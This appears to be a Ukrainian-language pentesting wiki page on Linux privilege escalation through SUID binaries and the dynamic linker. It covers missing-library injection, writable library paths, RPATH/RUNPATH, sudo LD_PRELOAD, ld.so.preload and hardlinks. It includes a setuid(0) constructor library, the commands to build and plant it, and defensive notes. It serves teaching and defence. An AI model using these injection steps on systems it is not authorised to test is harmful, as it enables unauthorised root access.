# Зловживання спільними бібліотеками та компонувальником SUID

{{#include ../../banners/hacktricks-training.md}}

Бінарні файли SUID зазвичай перевіряють на можливість безпосереднього виконання команд, але спеціальні програми SUID також можуть бути вразливими через динамічний компонувальник. Загальна суть проста: привілейований виконуваний файл завантажує код із шляху або конфігурації, на які може впливати користувач із нижчими привілеями.<sup>[[1]](#references)</sup>

На цій сторінці розглянуто типові загальні прийоми: відсутні бібліотеки, каталоги бібліотек із правом запису, `RPATH`/`RUNPATH`, `LD_PRELOAD` через sudo, конфігурацію компонувальника та плутанину з жорсткими посиланнями SUID.

Про заголовки програм ELF, динамічний розділ і поведінку завантажувача, що лежать в основі цих перевірок, див. [Основна інформація про ELF](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md).

## Швидкий пошук

Спершу знайдіть незвичні файли SUID і перевірте, чи пов’язані вони динамічно:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

Використовуйте `readelf` для незнайомого виконуваного файла: [`ldd` може виконати недовірений ELF-інтерпретатор](https://man7.org/linux/man-pages/man1/ldd.1.html). `readelf` показує прямі залежності, тому окремо перевірте шлях, який фактично вибирає loader.<sup>[[1]](#references)[[3]](#references)</sup>

Зосередьтеся на нестандартних розташуваннях, шляхах до користувацьких застосунків, бінарних файлах, що належать root, але розміщені поза каталогами, якими керують пакунки, а також на залежностях, що завантажуються з каталогів, доступних для запису.<sup>[[1]](#references)</sup>

Корисні перевірки доступності для запису:

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Missing Shared Object Injection

Деякі користувацькі SUID-бінарні файли намагаються завантажити shared object, якого не існує. Якщо відсутній шлях розташований у каталозі, контрольованому атакувальником, бінарний файл може завантажити наданий атакувальником код із правами ефективного користувача.<sup>[[1]](#references)</sup>

Така сама умова діє для **користувацького бінарного файла, запуск якого дозволено через sudo**, якщо він викликає `dlopen()` для абсолютного шляху до `.so` у домашньому каталозі або каталозі конфігурації, доступному для запису користувачем-викликачем. Таке пізнє завантаження бібліотеки може не відображатися у виводі `ldd` та записах ELF `NEEDED`. Обмежений перегляд за допомогою `strings` або трасування **непривілейованого** запуску може виявити шлях, який намагається використати програма; пароль програми або вибір пункту меню може визначати, чи буде виконано пошук. Перш ніж розглядати це як підвищення привілеїв, перевірте точне правило sudo, шлях і дозволи батьківського каталогу, а також те, що привілейований запуск доходить до цього пошуку. Не запускайте ціль через sudo лише для її переліку.

Знайдіть невдалі спроби пошуку бібліотек за допомогою фільтра системних викликів `strace`:<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

Якщо бінарний файл шукає `libexample.so` у доступному для запису каталозі, мінімальна бібліотека для підтвердження впливу може використовувати конструктор. Під час перевірки підтвердження впливу має бути нешкідливим:<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

Зберіть його з точною назвою файлу, яку намагається завантажити бінарний файл:

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

Експлуатована умова — це не лише відсутня бібліотека. Зловмисник має мати змогу розмістити сумісний shared object за шляхом, який прийме привілейований loader.<sup>[[1]](#references)</sup>

## Writable Library Directory

Іноді всі залежності наявні, але один із каталогів, що використовуються для їхнього пошуку, доступний для запису. Це може дозволити замінити завантажену бібліотеку або розмістити бібліотеку з такою самою назвою, що матиме вищий пріоритет.<sup>[[1]](#references)</sup>

Така сама перевірка стосується custom ELF, **дозволеного через sudo**, навіть якщо ELF не має біта SUID, а дозволений обліковий запис RunAs не є root. Порівняйте записи `DT_NEEDED` із шляхом до бібліотеки, який визначить loader; потім перевірте, чи може користувач, який викликає команду, змінити цей файл або замінити його через доступний для запису каталог-батько, у якому дозволений пошук. Переконайтеся в точному правилі sudo RunAs, перевірте symlinks і ACL, політику loader та те, що цільовий процес завантажує бібліотеку з правами привілейованішого облікового запису. Файл `.so`, доступний для запису, або сама назва залежності — лише зачіпка; перевіряйте метадані, не запускаючи команду sudo.<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

Перевірте шляхи залежностей:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

Якщо каталог доступний для запису, перевірте це в лабораторному середовищі безпечним для копій способом. Заміна системних бібліотек на активному хості може призвести до того, що процеси, які запускаються паралельно, використовуватимуть несумісні версії бібліотек.<sup>[[8]](#references)</sup>

### Бібліотеки, доступні для запису, усередині chroot

Сам по собі chroot не закриває успадковані файлові дескриптори й не обмежує весь доступ до файлової системи. Якщо пісочниця залишає дескриптор каталогу, що вказує за межі її нового кореневого каталогу, а ув’язнений процес може звернутися до цього дескриптора (наприклад, через доступний запис `/proc/<pid>/fd/`), шляхи хоста можуть залишатися доступними. Це проблема меж файлової системи; сама по собі вона не надає привілеїв root.<sup>[[11]](#references)[[12]](#references)</sup>

Окремо перевірте, чи може ув’язнений користувач записувати в каталог бібліотек, який використовуватиме **виконуваний файл хоста з root-SUID**, запущений із jail. Завантажувач шукає залежності у файловому поданні процесу, тому контрольована зловмисником бібліотека в такому каталозі може виконатися з ефективною ідентичністю SUID-програми. Перевірте конкретний виконуваний файл, його біт SUID і політику монтування, ціль дескриптора та права доступу, шлях пошуку бібліотек у jail, а також те, чи може програма фактично дістатися до виконуваного файлу хоста. File capability на засобі запуску пісочниці, доступний для запису jail або бінарний файл хоста з SUID окремо — лише зачіпка; повний ланцюжок залежить від реалізації пісочниці.<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH і RUNPATH

`RPATH` і `RUNPATH` — це записи динамічного розділу, які вказують завантажувачу, де шукати бібліотеки. Вони становлять небезпеку в SUID-програмах, якщо вказують на каталоги, доступні для запису зловмиснику.<sup>[[1]](#references)</sup>

Виявлення:<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

Приклад ризикованого виводу:

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

Якщо каталог `/opt/app/lib` доступний для запису, а бінарному файлу потрібна бібліотека `libcustom.so`, зловмисник може розмістити там шкідливу `libcustom.so`:<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` і `RUNPATH` відрізняються в деяких деталях пошуку, але під час перевірки на підвищення привілеїв практичне питання однакове: чи шукає SUID-бінарний файл бібліотеку за назвою в каталозі, доступному для запису зловмиснику?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH і SUID

У звичайних програмах `LD_PRELOAD` і `LD_LIBRARY_PATH` можуть примусово викликати або змінювати завантаження shared object. Для SUID-програм dynamic loader зазвичай переходить у режим безпечного виконання та ігнорує небезпечні змінні середовища.<sup>[[1]](#references)</sup>

Це означає, що звичайний SUID-бінарний файл зазвичай не є вразливим лише через те, що користувач може встановити `LD_PRELOAD`:<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

Поширений виняток — політика sudo, яка дозволяє задавати змінні середовища в командному рядку для цільової команди, наприклад, за допомогою тегу `SETENV` або відповідної опції `setenv`. Якщо цільова команда динамічно компонована, а sudo приймає `LD_PRELOAD=/path/to/library`, цільова команда може завантажити код, контрольований користувачем. Перевірте чинне правило та ідентичність цільової команди. Самого лише додавання `LD_PRELOAD` до `env_keep` недостатньо в системах, де динамічний завантажувач видаляє успадкований `LD_PRELOAD` до запуску SUID-процесу `sudo`; призначення змінної в командному рядку обробляється sudo після власного запуску.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

Не плутайте ці випадки: наведені вище правила завантажувача та політики sudo розрізняють їх:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` для звичайного SUID-бінарного файла: зазвичай блокується під час безпечного виконання.
- `LD_PRELOAD`, прийнятий як призначення в командному рядку sudo для привілейованої динамічно скомпонованої цілі: потенційно можна використати.
- Відсутній `.so` у доступному для запису шляху: можна використати, якщо SUID-бінарний файл завантажує цей шлях за звичайного виконання.
- `RPATH`/`RUNPATH` до доступного для запису каталогу: можна використати, якщо є змога контролювати потрібну бібліотеку.
- Доступ на запис до `/etc/ld.so.preload` або конфігурації компонувальника: впливає на всю систему та має серйозні наслідки.

## Конфігурація компонувальника

`ld.so` використовує кеш компонувальника та `/etc/ld.so.preload`; `ldconfig` створює цей кеш на основі `/etc/ld.so.conf` і файлів, підключених із нього, зазвичай із `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Перевірки з високою цінністю:

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

Записувана конфігурація компонувальника зазвичай становить серйознішу загрозу, ніж окремий вразливий SUID-бінарний файл, оскільки може впливати на багато динамічно скомпонованих процесів. Файл `/etc/ld.so.preload` особливо небезпечний, адже може примусово завантажувати спільний об’єкт у привілейовані процеси.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlink-и дають змогу одному й тому самому SUID inode відображатися під кількома іменами.<sup>[[9]](#references)</sup> Це можна використати, щоб приховати привілейований допоміжний файл, ускладнити очищення або обійти наївну перевірку на основі шляхів.

Знайдіть SUID-файли з кількістю посилань понад одне:<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

Перевірте всі шляхи до того самого inode:<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

Зловживання полягає не в тому, що жорстке посилання змінює дозволи. Зловживання пов’язане з плутаниною зі шляхами: до привілейованого inode можна дістатися за іменем, якого захисники чи скрипти не очікують.<sup>[[9]](#references)</sup> Докладніше про inode та роботу з жорсткими посиланнями див. у [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- За можливості використовуйте мінімальну кількість SUID-бінарних файлів, перевіряйте їх і керуйте ними через пакетний менеджер.
- Не допускайте, щоб записи `RPATH`/`RUNPATH` вказували на каталоги, доступні для запису або керовані застосунками.<sup>[[1]](#references)[[8]](#references)</sup>
- Каталоги бібліотек мають належати root і бути недоступними для запису звичайним користувачам.<sup>[[8]](#references)</sup>
- Не зберігайте `LD_PRELOAD`, `LD_LIBRARY_PATH` або подібні змінні завантажувача під час використання sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Відстежуйте `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` і неочікувані SUID-файли.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Перевіряйте SUID-файли з жорсткими посиланнями та досліджуйте нестандартні SUID-обгортки поза стандартними системними шляхами.<sup>[[9]](#references)</sup>
